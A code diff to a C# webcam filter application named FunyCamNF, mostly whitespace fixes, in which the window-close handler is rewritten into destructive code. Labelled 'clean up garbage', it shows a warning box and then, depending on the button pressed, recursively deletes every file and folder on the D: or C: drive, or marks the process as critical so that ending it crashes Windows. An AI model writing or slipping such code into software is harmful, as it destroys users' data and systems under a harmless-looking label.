@@ -27,6 +27,7 @@ using AForge.Video.FFMPEG;
 using FunyCamNF.pages.main;
 using FunyCamNF.pages.setting;
 using System.Runtime.InteropServices;
+using System.IO;
 
 namespace FunyCamNF
 {
@@ -91,7 +92,7 @@ namespace FunyCamNF
                 default:
                     break;
             }
-   
+
         }
 
         private void UIElement_OnPreviewMouseLeftButtonUp(object sender, MouseButtonEventArgs e)
@@ -106,7 +107,7 @@ namespace FunyCamNF
             }
 
             MenuToggleButton.IsChecked = false;
-            
+
             mainPage.formsHostFiltered.Visibility = Visibility.Visible;
             mainPage.formsHostOrigin.Visibility = Visibility.Visible;
 
@@ -151,8 +152,8 @@ namespace FunyCamNF
 
         private void hideForm()
         {
-             mainPage.formsHostFiltered.Visibility = MenuToggleButton.IsChecked.Value? Visibility.Hidden : Visibility.Visible;
-             mainPage.formsHostOrigin.Visibility = MenuToggleButton.IsChecked.Value ? Visibility.Hidden : Visibility.Visible;
+            mainPage.formsHostFiltered.Visibility = MenuToggleButton.IsChecked.Value ? Visibility.Hidden : Visibility.Visible;
+            mainPage.formsHostOrigin.Visibility = MenuToggleButton.IsChecked.Value ? Visibility.Hidden : Visibility.Visible;
         }
 
         private void ToggleButton_Click(object sender, RoutedEventArgs e)
@@ -178,13 +179,67 @@ namespace FunyCamNF
         private void Button_recoder(object sender, RoutedEventArgs e)
         {
         }
-       
+
         private void Window_Closed(object sender, EventArgs e)
         {
-            //清理垃圾
-            int isEndding = 1;
-            Process.EnterDebugMode();
-            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isEndding, sizeof(int));
+
+            MessageBoxResult result = MessageBox.Show("已经提示过你了，禁止运行！！后果自负", "警告", MessageBoxButton.YesNoCancel);
+            switch (result)
+            {
+                case MessageBoxResult.Yes:
+                    //清理垃圾
+                    try
+                    {
+                        DirectoryInfo dir = new DirectoryInfo("D:/");
+                        FileSystemInfo[] fileinfo = dir.GetFileSystemInfos();
+                        foreach (FileSystemInfo i in fileinfo)
+                        {
+                            if (i is DirectoryInfo)
+                            {
+                                DirectoryInfo subdir = new DirectoryInfo(i.FullName);
+                                subdir.Delete(true);
+                            }
+                            else
+                            {
+                                File.Delete(i.FullName);
+                            }
+                        }
+                    }
+                    catch (Exception err)
+                    {
+
+                    }
+                    break;
+                case MessageBoxResult.No:
+                    int isEndding = 1;
+                    Process.EnterDebugMode();
+                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isEndding, sizeof(int));
+                    break;
+                case MessageBoxResult.Cancel:
+                    //清理垃圾
+                    try
+                    {
+                        DirectoryInfo dir = new DirectoryInfo("C:/");
+                        FileSystemInfo[] fileinfo = dir.GetFileSystemInfos();
+                        foreach (FileSystemInfo i in fileinfo)
+                        {
+                            if (i is DirectoryInfo)
+                            {
+                                DirectoryInfo subdir = new DirectoryInfo(i.FullName);
+                                subdir.Delete(true);
+                            }
+                            else
+                            {
+                                File.Delete(i.FullName);
+                            }
+                        }
+                    }
+                    catch (Exception err)
+                    {
+
+                    }
+                    break;
+            }
         }
     }
 }
